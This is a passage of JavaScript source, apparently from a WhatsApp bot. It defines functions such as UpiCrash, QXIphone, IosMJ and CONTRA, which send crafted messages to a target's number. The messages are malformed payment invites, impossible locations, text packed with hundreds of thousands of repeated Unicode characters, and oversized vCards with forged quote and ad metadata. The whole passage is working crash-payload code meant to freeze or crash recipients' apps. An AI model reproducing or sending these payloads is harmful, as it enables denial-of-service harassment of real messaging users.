"ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " faMzy " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
//bug ios
async function UpiCrash(target) {
      await cella.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function VenCrash(target) {
      await cella.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function AppXCrash(target) {
      await cella.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrash(target) {
      await cella.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

async function newsLetter(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `120363209022250445@newsletter`,
                                newsletterName: "𝐅𝐚𝐦𝐳𝐲𝐋𝐞𝐞" + "ી".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await cella.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }

    async function SqCrash(target) {
      await cella.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphone(target) {
      await cella.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await cella.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://t.me/famzzy_lee",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayIos(target) {
      await cella.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(target) {
      await cella.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      cella.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(990000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝕱𝖆𝖒𝖟𝖞𝖃𝖙𝖗𝖊𝖒𝖊 🔱" + "ꦾ࣯࣯".repeat(120000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //

    async function IosMJ(target, Ptcp = false) {
      await cella.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "  ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ :)" + "ꦾ".repeat(990000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/famzzy_lee",
                mediaUrl: "https://wa.me/2348146895993",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://wa.me/2348146895993",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "2348146895993-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "2348146895993-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbcayCampaignId: "smb_cay_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }


// 
async function CONTRA(target, Ptcp = true) {
  let virtex = "𝚂̸̴̸̡⃨̺̘͚̝͙̪̘͋̓̾͆̓̔͝͝𝙴̴̴̵̡⃨̼̠͉͉͙͖̠̈́̚̚͘͝͝͠𝙲̴̴̸⃨̺̺̫͕̼͎͇͙̿͊͊̔̓̀͝͝͠𝚁̸̸̴⃨̫̝̦͔͓͎͚͚̿̐͒͋̓͊̒̕͝𝙴̸̵̴⃨̼̝͓̺̙̪͚̘̝̓̓̽̓̽̽͑̕𝚃̸̵̵⃨̫͖̙̟͍̦̪͛̓̐̓͌͐̀͘͠ ཉ";  let PuKi = 'ါ'.repeat(20000);
  const jids = "@0~".repeat(54100);
  const ui = 'ါ'.repeat(1900);
    await cella.relayMessage(target, {
      groupMentionedMessage: {
       message: {
        interactiveMessage: {
         header: {
          contactsArrayMessage: {
    displayName: " 𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭Mantapp𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭ㅤ          ㅤ          ㅤ           ༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊",
    contacts: [
      {
        displayName: "𝙲̸̵̴͙͔͎̪̦̦̪̼̞̿̔͑̐͋͘𝙾̴̴̴͙͔͚̞̼͕͔͆́̔̔̓̔͜͜͝͠͝𝙽̵̸̴͔̻̦̪̪͉͍͍͋͌̓͊͘͘͘͜͝͠𝚃̴̵̵̢͔͚͖̠̫͕̙̪͑̿̓̾́͘͘̕͝𝚁̴̴̸̢̪̟̘͎̠͇͎͍́̿̔͛͒̾͆͑͊𝙰̸̵̸͉̻̺͇͉͕̘̿͊̓̈́̀́̚͝͝" + "ꦾ".repeat(30000),
        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:+2348146895993\nFN:+2348146895993\nitem1.TEL;waid=2348127187030:2348127187030\nitem1.X-ABLabel:𝙲𝙾𝙽𝚃𝚁𝙰 𝙱𝚈 Fa${ui}\nitem2.EMAIL;type=INTERNET:🪭Mantapp${jids}\nitem2.X-ABLabel:YouTube\nitem3.URL:🏮🄲🄾🄽🅃🅁🄰 + ꦾ.repeat(30000)\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;\nitem4.X-ABLabel:Region\nEND:VCARD"
      },
      {
        displayName: "𝙲̸̵̴͙͔͎̪̦̦̪̼̞̿̔͑̐͋͘𝙾̴̴̴͙͔͚̞̼͕͔͆́̔̔̓̔͜͜͝͠͝𝙽̵̸̴͔̻̦̪̪͉͍͍͋͌̓͊͘͘͘͜͝͠𝚃̴̵̵̢͔͚͖̠̫͕̙̪͑̿̓̾́͘͘̕͝𝚁̴̴̸̢̪̟̘͎̠͇͎͍́̿̔͛͒̾͆͑͊𝙰̸̵̸͉̻̺͇͉͕̘̿͊̓̈́̀́̚͝͝" + "ꦾ".repeat(10000),
        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:+2348146895993\nFN:+2348146895993\nitem1.TEL;waid=2348146895993:2348146895993\nitem1.X-ABLabel:𝙲𝙾𝙽𝚃𝚁𝙰 𝙱𝚈 Fa\nitem2.EMAIL;type=INTERNET:🪭Mantapp⪼\nitem2.X-ABLabel:YouTube\nitem3.URL:🏮🄲🄾🄽🅃🅁🄰 + ꦾ.repeat(10000)\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;\nitem4.X-ABLabel:Region\nEND:VCARD"
      },
      {
        displayName: "𝙲̸̵̴͙͔͎̪̦̦̪̼̞̿̔͑̐͋͘𝙾̴̴̴͙͔͚̞̼͕͔͆́̔̔̓̔͜͜͝͠͝𝙽̵̸̴͔̻̦̪̪͉͍͍͋͌̓͊͘͘͘͜͝͠𝚃̴̵̵̢͔͚͖̠̫͕̙̪͑̿̓̾́͘͘̕͝𝚁̴̴̸̢̪̟̘͎̠͇͎͍́̿̔͛͒̾͆͑͊𝙰̸̵̸͉̻̺͇͉͕̘̿͊̓̈́̀́̚͝͝" + "ါ".repeat(3900),
        vcard: "BEGIN:VCARD\nVERSION:3.0\nN:2348146895993\nFN:+2348146895993\nitem1.TEL;waid=2348146895993:2348146895993\nitem1.X-ABLabel:𝙲𝙾𝙽𝚃𝚁𝙰 𝙱𝚈 Fa\nitem2.EMAIL;type=INTERNET:🪭Mantapp⪼𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭Fa𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭ㅤ          ㅤ          ㅤ           ༑̴ۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۬ۙۦۘۘۘ۬ۡ۠۟ۛ۫ۢۖۧۘۚۚۘۘۦۢۘ۫ۖۜۘۛۥۦۥۢۥۘۦۧۡۘۘۥۛۥۜۧۥۧۘۢۗۢۤۙۜۘ۬ۥۦۖۚ۬ۖ۠ۨ۠ۨۘۜۛۥۘ۫ۙۨۡۛۦۥۡۡۘۤۥۜۘۥ۠ۘۖۤۤ۟ۢۜۘۧۜ۫ۙ۬ۗ۬۠ۘۗۜۤۧۥۖۘ۟ۨۦۤۗۘۘۢۢۖۡۜۗۜۡۨ۠ۥۚۢۢۖۘۥۥۡ۫ۜۥ۫ۛۧۤ۟ۥۧۦ۫۫ۘ۟ۜ۟ۧۚ۟ۤۜۧۘۘۨ۬ۨۛۗۙۧۚۗۥ۠ۖۘۥۥۗۤۢۜۛۖۥۛ۫ۤۤۧ۫ۚۗۡۘ۬ۢ۫ۦۨۛۦۙۥۘۘۦۘ۫ۖۨۡۦۦۘۚۨۧۘ۬۠ۧۜۨۨۛ۫ۛ۠ۦۥ۬ۗۦۧ۟ۨۘۙۜ۬ۧۥ۬۟ۦ۬۬۬ۙۦۘۘۘ۬ۡ⟆̤̊ + ါ.repeat(11000)\nitem2.X-ABLabel:YouTube\nitem3.URL:🏮🄲🄾🄽🅃🅁🄰\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;\nitem4.X-ABLabel:Region\nEND:VCARD"
      }
    ],
    contextInfo: {
